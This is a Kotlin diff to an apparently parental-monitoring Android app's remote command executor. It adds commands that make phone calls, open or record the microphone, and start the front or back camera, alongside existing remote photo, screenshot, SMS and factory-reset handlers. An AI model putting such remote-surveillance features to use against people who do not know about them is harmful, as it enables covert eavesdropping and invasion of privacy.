@@ -4,12 +4,15 @@ import android.Manifest
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.hardware.camera2.CameraCharacteristics
 import android.media.AudioManager
 import android.os.Build
 import android.telephony.SmsManager
 import androidx.core.content.ContextCompat
 import com.kids.monitor.AdminReceiver
+import com.kids.monitor.CameraService
 import com.kids.monitor.MonitorService
 import com.kids.monitor.NotificationRelayService
 import com.kids.monitor.ScreenShareService
@@ -27,6 +30,25 @@ object CommandExecutor {
                 "send_message" -> sendMessage(context, payload)
                 "take_photo" -> takePhoto(context)
                 "take_screenshot" -> takeScreenshot()
+                "make_call" -> makeCall(context, payload)
+                "mic_start" -> {
+                    MonitorService.startMic(context)
+                    ok("تم فتح المايك (استماع فقط)")
+                }
+                "mic_stop" -> {
+                    MonitorService.stopMic()
+                    ok("تم إيقاف المايك")
+                }
+                "record_mic" -> {
+                    MonitorService.recordMic(context)
+                    ok("جارٍ تسجيل مقطع صوتي…")
+                }
+                "camera_front_start" -> startCamera(context, CameraCharacteristics.LENS_FACING_FRONT)
+                "camera_back_start" -> startCamera(context, CameraCharacteristics.LENS_FACING_BACK)
+                "camera_stop" -> {
+                    CameraService.stop(context)
+                    ok("تم إيقاف الكاميرا")
+                }
                 "factory_reset" -> factoryReset(context)
                 "sync_now" -> {
                     MonitorService.syncNow(context)
@@ -100,6 +122,29 @@ object CommandExecutor {
         return ok("تم إرسال الرسالة")
     }
 
+    private fun makeCall(context: Context, payload: Map<String, Any>): Map<String, Any> {
+        val number = payload["number"]?.toString()?.trim().orEmpty()
+        if (number.isBlank()) return fail("الرقم فارغ")
+        if (!Permissions.has(context, Manifest.permission.CALL_PHONE)) {
+            return fail("يتطلب صلاحية الاتصال الهاتفي")
+        }
+        val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(number)))
+            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        return try {
+            context.startActivity(intent)
+            ok("تم بدء الاتصال")
+        } catch (e: Exception) {
+            fail("تعذر بدء الاتصال")
+        }
+    }
+
+    private fun startCamera(context: Context, facing: Int): Map<String, Any> {
+        if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
+        CameraService.start(context, facing)
+        return ok(if (facing == CameraCharacteristics.LENS_FACING_FRONT) "تشغيل الكاميرا الأمامية"
+        else "تشغيل الكاميرا الخلفية")
+    }
+
     private fun takePhoto(context: Context): Map<String, Any> {
         if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
         val file = CameraCapture.capture(context) ?: return fail("تعذر التقاط صورة")
@@ -123,7 +168,7 @@ object CommandExecutor {
         return ok("تم التقاط صورة ورفعها")
     }
 
-    /** لقطة شاشة فورية  via خدمة مشاركة الشاشة النشطة. */
+    /** لقطة شاشة فورية عبر خدمة مشاركة الشاشة النشطة. */
     private fun takeScreenshot(): Map<String, Any> {
         if (!ScreenShareService.isRunning()) {
             return fail("يتطلب تفعيل مشاركة الشاشة من التطبيق أولاً")
